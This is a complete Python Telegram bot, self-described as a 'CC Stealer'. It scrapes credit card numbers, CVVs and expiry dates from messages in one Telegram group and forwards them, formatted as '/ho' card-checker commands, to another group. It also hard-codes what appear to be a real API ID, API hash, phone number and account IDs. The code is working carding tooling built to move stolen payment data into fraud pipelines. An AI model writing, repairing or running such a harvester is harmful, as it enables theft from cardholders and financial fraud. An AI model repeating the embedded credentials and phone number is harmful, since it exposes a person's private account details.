from telethon import TelegramClient, events
import re
import asyncio

# ================== CONFIG ==================
API_ID = 25777114
API_HASH = "83d41274e41d8330fc83876fb499432b"
PHONE_NUMBER = "+919908262004"

SOURCE_GROUP = -1002682944548    # Jaha se uthana hai
TARGET_GROUP = -1002882603089    # Jaha bhejna hai
OWNER_ID = 7835198116
# =============================================

# To avoid duplicates
seen = set()
running = False

# Initialize client
client = TelegramClient("cc_stealer", API_ID, API_HASH)

# --- Ultimate card extractor function ---
def extract_combos(text):
    """
    Universal extractor for almost all card formats
    """
    pattern = r"""
    (\d{13,16})                         # CC number
    .*?                                  # anything in between
    (?:CVV:|CVC:|cvv\s*:\s*)?           # optional CVV label
    (\d{3,4})?                           # CVV (optional)
    .*?                                  # anything in between
    (?:EXP:|EXPIRE:|Exp\. month:|Exp\. year:|exp\s*:\s*)?  # optional expiry labels
    (\d{1,2})                            # month
    /                                     # separator
    (\d{2,4})                            # year
    """
    
    matches = re.findall(pattern, text, re.DOTALL | re.IGNORECASE | re.VERBOSE)
    
    results = []
    for ccnum, cvv, month, year in matches:
        month = month.zfill(2)
        year = year[-2:]
        cvv = cvv if cvv else "000"  # default if CVV missing
        combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
        if combo not in seen:
            seen.add(combo)
            results.append(combo)
    return results

# --- Commands ---
@client.on(events.NewMessage(pattern=r'/start stealer'))
async def start_stealer(event):
    global running
    if event.sender_id != OWNER_ID:
        await event.reply("❌ You are not authorized to run this command.")
        return
    running = True
    await event.reply("✅ Stealer started! Extracting CC combos from the group.")

@client.on(events.NewMessage(pattern=r'/stop stealer'))
async def stop_stealer(event):
    global running
    if event.sender_id != OWNER_ID:
        await event.reply("❌ You are not authorized to run this command.")
        return
    running = False
    await event.reply("🛑 Stealer stopped!")

# --- Main message handler ---
@client.on(events.NewMessage(chats=SOURCE_GROUP))
async def handler(event):
    global running
    if not running:
        return
    
    text = event.raw_text
    combos = extract_combos(text)
    
    for combo in combos:
        await client.send_message(TARGET_GROUP, combo)
        print("Forwarded:", combo)

# --- Main ---
async def main():
    print("Starting CC Stealer Bot...")
    await client.start(PHONE_NUMBER)
    print("Bot is ready. Waiting for /start stealer command...")

with client:
    client.loop.run_until_complete(main())
    client.run_until_disconnected()
